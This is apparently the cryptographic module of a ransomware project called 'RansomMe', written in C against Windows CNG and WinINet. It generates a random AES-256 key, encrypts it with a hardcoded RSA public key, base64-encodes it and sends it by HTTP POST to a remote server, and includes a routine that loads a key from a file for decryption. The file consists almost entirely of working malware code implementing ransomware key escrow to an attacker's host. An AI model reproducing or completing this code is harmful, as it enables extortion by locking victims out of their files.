#include "RansomMe.h"

// static functions
static NTSTATUS LoadPublicKey(BCRYPT_ALG_HANDLE* hProv, BCRYPT_KEY_HANDLE* hKey);
static BOOL SendKeyOverHTTP(const char* serverName, INTERNET_PORT serverPort, const char* postData);
static BOOL ExportToPEM(BCRYPT_KEY_HANDLE* hKey, BCRYPT_KEY_HANDLE* hPubKey, char** keyEncoded);
BOOL LoadKeyFromFile(BCRYPT_ALG_HANDLE* hAlgProv, BCRYPT_KEY_HANDLE* hKey, const char* keyFileName);

// Initialize the crypto environment, hAlgProv will point to the algorithm provider and hKey to the key handler
NTSTATUS initCrypto(BCRYPT_ALG_HANDLE* hAlgProv, BCRYPT_ALG_HANDLE* hRng, BCRYPT_KEY_HANDLE* hKey) {

    NTSTATUS status = 0;
    BYTE key[AES256_KEY_LENGTH];

    // Open the BCRYPT_RNG_ALGORITHM provider
    status = BCryptOpenAlgorithmProvider(hRng, BCRYPT_RNG_ALGORITHM, NULL, 0);
    if (!BCRYPT_SUCCESS(status)) {
        fprintf(stderr, "Error opening RNG algorithm provider: 0x%x\n", status);
        return status;
    }

    // Generate a random key
    status = BCryptGenRandom(*hRng, key, AES256_KEY_LENGTH, 0);
    if (!BCRYPT_SUCCESS(status)) {
        fprintf(stderr, "Error generating random key: 0x%x\n", status);
        return status;
    }

    // Open the AES algorithm provider
    status = BCryptOpenAlgorithmProvider(hAlgProv, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!BCRYPT_SUCCESS(status)) {
        fprintf(stderr, "Error opening AES algorithm provider: 0x%x\n", status);
        return status;
    }

    // Generate the encryption key
    status = BCryptGenerateSymmetricKey(*hAlgProv, hKey, NULL, 0, (PUCHAR)key, AES256_KEY_LENGTH, 0);
    if (!BCRYPT_SUCCESS(status)) {
        fprintf(stderr, "Error generating AES key: 0x%x\n", status);
        return status;
    }

    return status;
}

// Initialize the crypto environment, hCryptProv will point to the crypt provider and hKey to the key handler
// I would like to call this InitCrypto as well, but I don't know how to overload a function in c
BOOL initDeCrypto(BCRYPT_ALG_HANDLE* hAlgProv, BCRYPT_KEY_HANDLE* hKey, const char* keyFile) {
    NTSTATUS status = 0;

    // Open the AES algorithm provider
    status = BCryptOpenAlgorithmProvider(hAlgProv, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!BCRYPT_SUCCESS(status)) {
        fprintf(stderr, "Error opening AES algorithm provider: 0x%x\n", status);
        return FALSE;
    }
    // load the key from a file
    if (!LoadKeyFromFile(hAlgProv, hKey, keyFile)) {
        printf("Error loading the key from %s. Error Code: %lu\n", keyFile, GetLastError());
        return FALSE;
    }

    printf("Key successfully loaded from %s\n", keyFile);
    return TRUE;
}

// The public key bytes are hardcoded, this function import it
static NTSTATUS LoadPublicKey(BCRYPT_ALG_HANDLE* hProv, BCRYPT_KEY_HANDLE* hKey) {

    // Public key
    BYTE keyBlob[] = {
    0x52, 0x53, 0x41, 0x31, 0x00, 0x10, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01, 0xDC, 0x5F, 0xF9, 0x31, 0x2C,
    0x3B, 0xCA, 0x3E, 0xF0, 0xAF, 0x9B, 0x55, 0xDB, 0xA7, 0x29, 0xDA, 0x74, 0x2B, 0xEB, 0xBC, 0xF9,
    0x3E, 0xF6, 0x36, 0x18, 0x5D, 0x92, 0xFA, 0x61, 0x48, 0xA0, 0x57, 0x90, 0xC1, 0x32, 0xBC, 0x9D,
    0x92, 0xD5, 0xDE, 0x6B, 0x6A, 0x51, 0x31, 0x3A, 0x2B, 0x2D, 0xC0, 0x70, 0x63, 0x60, 0x9D, 0x88,
    0x5F, 0xAE, 0xF7, 0x27, 0xF3, 0xE5, 0xD7, 0xC1, 0x8A, 0xB9, 0xAB, 0xE0, 0x29, 0xBE, 0x2B, 0xB2,
    0xBC, 0x50, 0x3A, 0xB8, 0xD6, 0xE9, 0x1C, 0x37, 0x53, 0x0C, 0x84, 0xF3, 0x81, 0x2B, 0x08, 0xF6,
    0x8A, 0x3C, 0x8A, 0xE6, 0x28, 0xA8, 0xF1, 0x7B, 0x92, 0xE3, 0xC6, 0xF6, 0x29, 0x33, 0xE9, 0x74,
    0x81, 0x4F, 0x89, 0x2D, 0x8E, 0xAB, 0x60, 0x1E, 0xCC, 0xD0, 0x1C, 0xD2, 0xB1, 0xD5, 0x95, 0x9C,
    0xA3, 0xA7, 0x7E, 0x92, 0x69, 0xF0, 0x43, 0x0D, 0x5D, 0x04, 0x19, 0xC0, 0x41, 0x15, 0x64, 0x04,
    0x16, 0xDD, 0x7E, 0x64, 0x2E, 0xC3, 0x98, 0xD3, 0xEC, 0x7C, 0xF4, 0xAD, 0x39, 0xB0, 0xA1, 0xA4,
    0x56, 0x11, 0x3E, 0x19, 0xAA, 0xDE, 0xDA, 0x66, 0x10, 0x6E, 0xAA, 0xC4, 0xF4, 0x52, 0xA9, 0xA2,
    0x00, 0x6F, 0xA0, 0xF3, 0x33, 0x49, 0xD5, 0x9B, 0x15, 0x0B, 0x1A, 0x25, 0x4B, 0x25, 0x55, 0x0E,
    0x98, 0xF3, 0x4F, 0x4E, 0x40, 0x7B, 0x00, 0x14, 0xCC, 0x93, 0xF1, 0xA6, 0x43, 0x25, 0x44, 0x96,
    0x38, 0xBE, 0x1A, 0x89, 0x1F, 0xA3, 0x1F, 0xA2, 0xC1, 0x36, 0x96, 0x47, 0xF2, 0x40, 0x2C, 0xED,
    0x27, 0xBF, 0x33, 0x0E, 0x3D, 0x57, 0x0B, 0x5D, 0x9D, 0x6C, 0xA6, 0x46, 0xFE, 0xF6, 0x69, 0x58,
    0xB5, 0x93, 0xEF, 0x0F, 0xDB, 0x29, 0xA1, 0xC3, 0x16, 0x02, 0x55, 0x37, 0x6C, 0x6D, 0xD1, 0x52,
    0xCC, 0x8D, 0xA0, 0xC7, 0x77, 0xEA, 0xD0, 0x46, 0x1E, 0xCD, 0xD7, 0x23, 0x8C, 0x86, 0xB7, 0x3B,
    0xBF, 0x09, 0x9E, 0x40, 0x93, 0x29, 0x54, 0xE9, 0x06, 0x75, 0x3C, 0x58, 0x20, 0x60, 0xE6, 0x65,
    0xAC, 0x89, 0x8D, 0x53, 0x83, 0xC3, 0xEF, 0x72, 0x08, 0xA0, 0x65, 0xC6, 0x15, 0x8A, 0x3B, 0xD7,
    0xC2, 0x47, 0x0E, 0xCA, 0x4B, 0xA4, 0xED, 0xEA, 0xDF, 0x94, 0x97, 0xE2, 0x84, 0x2E, 0x34, 0x48,
    0xF7, 0x62, 0x55, 0xED, 0x7C, 0x9F, 0xE5, 0x8A, 0x34, 0xAB, 0x19, 0xBB, 0x8F, 0x87, 0x22, 0x09,
    0x7C, 0x03, 0x00, 0x76, 0x72, 0xF2, 0xFD, 0x65, 0x70, 0x5D, 0xB6, 0xF4, 0x22, 0x21, 0x57, 0x79,
    0xE3, 0x0E, 0xA8, 0x97, 0x52, 0xEA, 0xDC, 0x51, 0xAE, 0x17, 0xA6, 0x62, 0xF8, 0x92, 0x01, 0xFC,
    0xB9, 0xEB, 0x12, 0x3B, 0xDE, 0xE3, 0x8E, 0x43, 0x21, 0xC1, 0xE4, 0x6B, 0xC1, 0x87, 0x5F, 0xDF,
    0xA7, 0x7B, 0xB7, 0xFB, 0x21, 0xCF, 0xB8, 0xB6, 0xDD, 0xE8, 0x40, 0xE7, 0xD7, 0x6F, 0x54, 0x82,
    0xB7, 0xE2, 0xA4, 0xC5, 0x02, 0x09, 0x2A, 0xBD, 0xAD, 0x86, 0xF7, 0x80, 0x27, 0x46, 0x3A, 0xC1,
    0x16, 0xA8, 0x7C, 0x63, 0x25, 0x36, 0x40, 0x0C, 0xEB, 0xAF, 0x53, 0x53, 0xDD, 0xF8, 0xE5, 0xBD,
    0xC1, 0x6E, 0xEB, 0x25, 0xD8, 0xC1, 0xAC, 0x71, 0xC2, 0x41, 0x93, 0xB7, 0xB5, 0x66, 0x92, 0x48,
    0xF6, 0x49, 0xE5, 0x53, 0x54, 0xB4, 0xA4, 0xEE, 0x0B, 0x60, 0x7F, 0x5A, 0xD0, 0x75, 0xE1, 0x45,
    0xEA, 0x52, 0x07, 0x9B, 0xD2, 0x84, 0xEA, 0x2C, 0x85, 0x50, 0x78, 0xA8, 0x1D, 0x3D, 0xEE, 0x0B,
    0xF2, 0xAE, 0xAD, 0x47, 0xCD, 0x2A, 0x91, 0xBF, 0x51, 0x42, 0x02, 0x9E, 0x2A, 0x31, 0x1F, 0x02,
    0x1E, 0xDC, 0x6E, 0xA6, 0x1E, 0x3F, 0x1C, 0xF8, 0x0B, 0xAC, 0xFF, 0x09, 0x9F, 0xD4, 0xF8, 0xF3,
    0x20, 0x85, 0x30, 0x45, 0xB6, 0x14, 0xB7, 0xC4, 0x56, 0xDB, 0xC1 };

    DWORD cbKeyBlob = sizeof(keyBlob);
    NTSTATUS status = 0;

    // Import public key
    status = BCryptImportKeyPair(*hProv, NULL, BCRYPT_RSAPUBLIC_BLOB, hKey, keyBlob, cbKeyBlob, 0);
    if (!BCRYPT_SUCCESS(status)) {
        fprintf(stderr, "Error exporting key: 0x%x\n", status);
        return status;
    }

    return status;
}

static BOOL ExportToPEM(BCRYPT_KEY_HANDLE* hKey, BCRYPT_KEY_HANDLE* hPubKey, char** keyEncoded) {
    NTSTATUS status = 0;                    // flag to get the bcrypt status
    BOOL success = FALSE;                   // flag to return the success/failure

    PBYTE pbBlob = NULL;                    // to store the exported keyBlob
    PBYTE pbEncBlob = NULL;                 // to store the encrypted keyBlob

    DWORD cbBlob = 0;                       // to store the size of the key blob
    DWORD cbEncBlob = 0;                    // to store the size of the encrypted key blob
    DWORD keyEncodedSize = 0;               // to store the size of the encoded key

    BCRYPT_OAEP_PADDING_INFO pPaddingInfo;  // padding info struct for the OAEP padding

    // Init the pPaddingInfo struct
    pPaddingInfo.pszAlgId = BCRYPT_SHA256_ALGORITHM;
    pPaddingInfo.pbLabel = NULL;
    pPaddingInfo.cbLabel = NULL;

    // Export the symmetric key into a byte array
    // Get the size of the encryption key blob
    status = BCryptExportKey(*hKey, NULL, BCRYPT_KEY_DATA_BLOB, NULL, 0, &cbBlob, 0);
    if (!BCRYPT_SUCCESS(status)) {
        fprintf(stderr, "Error exporting key: 0x%x\n", status);
        goto cleanup;
    }

    // Allocate memory for the encryption key blob
    pbBlob = (PBYTE)malloc(cbBlob);
    if (!pbBlob) {
        fprintf(stderr, "Error allocating memory for the key blob.\n");
        goto cleanup;
    }

    // Export the encryption key into the blob
    status = BCryptExportKey(*hKey, NULL, BCRYPT_KEY_DATA_BLOB, pbBlob, cbBlob, &cbBlob, 0);
    if (!BCRYPT_SUCCESS(status)) {
        fprintf(stderr, "Error exporting key: 0x%x\n", status);
        goto cleanup;
    }

    // Prepare to encrypt the symmetric key with the public key
    // Get the size of the encrypted blob
    status = BCryptEncrypt(*hPubKey, pbBlob, cbBlob, &pPaddingInfo, NULL, 0, NULL, 0, &cbEncBlob, BCRYPT_PAD_OAEP);
    if (!BCRYPT_SUCCESS(status)) {
        fprintf(stderr, "Error in BCryptEncrypt: 0x%x\n", status);
        goto cleanup;
    }

    // Allocate memory for the encrypted key blob
    pbEncBlob = (PBYTE)malloc(cbEncBlob);
    if (!pbEncBlob) {
        fprintf(stderr, "Error allocating memory for the encrypted key blob.\n");
        goto cleanup;
    }

    // Encrypt the key blob with the public key
    status = BCryptEncrypt(*hPubKey, pbBlob, cbBlob, &pPaddingInfo, NULL, 0, pbEncBlob, cbEncBlob, &cbEncBlob, BCRYPT_PAD_OAEP);
    if (!BCRYPT_SUCCESS(status)) {
        fprintf(stderr, "Error in BCryptEncrypt: 0x%x\n", status);
        goto cleanup;
    }

    // Base64 encode the encrypted key
    // Get the size of the returned encoded key
    if (!CryptBinaryToStringA(pbEncBlob, cbEncBlob, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &keyEncodedSize)) {
        printf("Base64 length calculation failed. Error: %lu\n", GetLastError());
        goto cleanup;
    }

    // Allocate memory for the encoded key
    *keyEncoded = (char*)malloc(keyEncodedSize);
    if (*keyEncoded == NULL) {
        fprintf(stderr, "Error allocating memory for the encoded key: %lu\n", GetLastError());
        goto cleanup;
    }

    // Get the encoded key
    if (!CryptBinaryToStringA(pbEncBlob, cbEncBlob, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, *keyEncoded, &keyEncodedSize)) {
        printf("Base64 encoding failed. Error: %lu\n", GetLastError());
        goto cleanup;
    }

    success = TRUE;

cleanup:

    if (pbBlob) { free(pbBlob); }
    if (pbEncBlob) { free(pbEncBlob); }
    if (!BCRYPT_SUCCESS(status)) {
        if (*keyEncoded != NULL) { free(*keyEncoded); }
    }
    
    return success;
}

static BOOL SendKeyOverHTTP(const char* serverName, INTERNET_PORT serverPort, const char* postData) {
    HINTERNET hInternet = NULL, hConnect = NULL, hRequest = NULL;       // The connection handlers
    const char* resource = "/index.html";                               // Hardcoded resource
    BOOL success = FALSE;                                               // Success flag

    // Initialize WinINet
    hInternet = InternetOpenA("WinINetPostExample", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        printf("InternetOpen failed. Error: %lu\n", GetLastError());
        goto cleanup;
    }

    // Connect to the server
    hConnect = InternetConnectA(hInternet, serverName, serverPort, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) {
        printf("InternetConnect failed. Error: %lu\n", GetLastError());
        goto cleanup;
    }

    // Open an HTTP request
    hRequest = HttpOpenRequestA(hConnect, "POST", resource, NULL, NULL, NULL, INTERNET_FLAG_RELOAD, 0);
    if (!hRequest) {
        printf("HttpOpenRequest failed. Error: %lu\n", GetLastError());
        goto cleanup;
    }

    // Set headers for the POST request
    const char* headers = "Content-Type: application/x-www-form-urlencoded";
    DWORD headersLength = (DWORD)strlen(headers);

    // Send the POST request
    BOOL bRequestSent = HttpSendRequestA(hRequest, headers, headersLength, (LPVOID)postData, (DWORD)strlen(postData));
    if (!bRequestSent) {
        printf("HttpSendRequest failed. Error: %lu\n", GetLastError());
        goto cleanup;
    }


//    printf("POST request sent successfully.\n");
    success = TRUE;

cleanup:
    if (hRequest) { InternetCloseHandle(hRequest); }
    if (hConnect) { InternetCloseHandle(hConnect); }
    if (hInternet) { InternetCloseHandle(hInternet); }

    return success;
}

// This function saves the key into a file, I want to change this to encrypt and send to a web server
BOOL ExportKey(BCRYPT_ALG_HANDLE* hCryptProv, BCRYPT_KEY_HANDLE* hKey, const char* serverName, INTERNET_PORT serverPort) {
    
    NTSTATUS status = 0;                    // status flag returned by BCRYPT functions
    BOOL success = FALSE;                   // flag to return the success/failure

    BCRYPT_ALG_HANDLE hRSAAlg = NULL;       // the public key algorithm provider
    BCRYPT_KEY_HANDLE hPubKey = NULL;       // the public key handler

    char** keyEncoded = NULL;               // to store the encoded key

    // Allocate memory for a char*
    keyEncoded = malloc(sizeof(char*));
    if (!keyEncoded) {
        printf("Error: Cannot allocate memory for keyEncoded. Error Code: %lu\n", GetLastError());
        goto cleanup;
    }

    // Open RSA algorithm provider
    status = BCryptOpenAlgorithmProvider(&hRSAAlg, BCRYPT_RSA_ALGORITHM, NULL, 0);
    if (!BCRYPT_SUCCESS(status)) {
        fprintf(stderr, "Error opening RSA algorithm provider: 0x%x\n", status);
        goto cleanup;
    }

    // First load the public key from the hardcoded constant
    status = LoadPublicKey(&hRSAAlg, &hPubKey);
    if (!BCRYPT_SUCCESS(status)) {
        fprintf(stderr, "Error: Cannot load public key. Error Code: 0x%x\n", status);
        goto cleanup;
    }

    // Then export the encryption key to PEM
    status = ExportToPEM(hKey, &hPubKey, keyEncoded);
    if (!BCRYPT_SUCCESS(status)) {
        fprintf(stderr, "Error: Cannot export key to PEM. Error Code: 0x%x\n", status);
        goto cleanup;
    }

    // Last send the key over HTTP
    if (!SendKeyOverHTTP(serverName, serverPort, *keyEncoded)) {
        printf("Error: Cannot send the key over HTTP. Error Code: %lu\n", GetLastError());
        goto cleanup;
    }

//    printf("Key successfully sent to %s\n", serverName);
    success = TRUE;

cleanup:
    if (hPubKey) { BCryptDestroyKey(hPubKey); }
    if (hRSAAlg) { BCryptCloseAlgorithmProvider(hRSAAlg, 0); }

    if (keyEncoded) {
        if (*keyEncoded != NULL) { free(*keyEncoded); }
        free(keyEncoded);
    }

    return success;
}

// This function imports a key from a file, the imported key should be a plain (no encryption) binary file (DER)
BOOL LoadKeyFromFile(BCRYPT_ALG_HANDLE* hAlgProv, BCRYPT_KEY_HANDLE* hKey, const char* keyFileName) {
 
    PBYTE pbBlob = NULL;                   // pointer to the key bytes
    DWORD cbBlob = 0;                     // the key size

    DWORD bytesRead = 0;                    // number of bytes read from the key file
    HANDLE hFile = INVALID_HANDLE_VALUE;    // key file handler
    
    BOOL success = FALSE;                   // success flag
    NTSTATUS status = 0;

    // open the key file
    hFile = CreateFileA(keyFileName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("Error: Unable to open key file %s. Error Code: %lu\n", keyFileName, GetLastError());
        goto cleanup;
    }

    // Get the size of the key blob
    cbBlob = GetFileSize(hFile, NULL);
    if (cbBlob == INVALID_FILE_SIZE) {
        printf("Error: Failed to get file size. Error Code: %lu\n", GetLastError());
        goto cleanup;
    }

    // Read the key blob into memory
    pbBlob = (BYTE*)malloc(cbBlob);
    if (!pbBlob) {
        printf("Error: Memory allocation failed.\n");
        goto cleanup;
    }

    // read the key file and store the byste in pbBlob
    if (!ReadFile(hFile, pbBlob, cbBlob, &bytesRead, NULL) || bytesRead != cbBlob) {
        printf("Error: Failed to read key file. Error Code: %lu\n", GetLastError());
        goto cleanup;
    }

    // Import the key into the cryptographic provider
    status = BCryptImportKey(*hAlgProv, NULL, BCRYPT_KEY_DATA_BLOB, hKey, NULL, 0, pbBlob, cbBlob, 0);
    if (!BCRYPT_SUCCESS(status)) {
        fprintf(stderr, "Error exporting key: 0x%x\n", status);
        goto cleanup;
    }

    success = TRUE;

cleanup:
    if (hFile != INVALID_HANDLE_VALUE) { CloseHandle(hFile); }
    if (pbBlob) { free(pbBlob); }

    return success;
}